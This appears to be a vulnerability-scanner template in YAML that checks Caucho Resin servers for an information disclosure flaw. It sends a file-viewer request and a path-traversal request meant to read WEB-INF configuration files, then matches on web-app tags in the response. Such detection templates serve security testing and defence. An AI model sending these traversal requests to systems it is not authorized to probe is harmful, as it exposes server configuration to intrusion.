id: caucho-resin-info-disclosure
info:
  author: pikpikcu
  name: Caucho Resin Information Disclosure
  reference:
  - https://www.exploit-db.com/exploits/27888
  severity: info
  tags: exposure,resin,caucho
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <web-app
    - </web-app>
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml'
  - '{{BaseURL}}/%20../web-inf/web.xml'
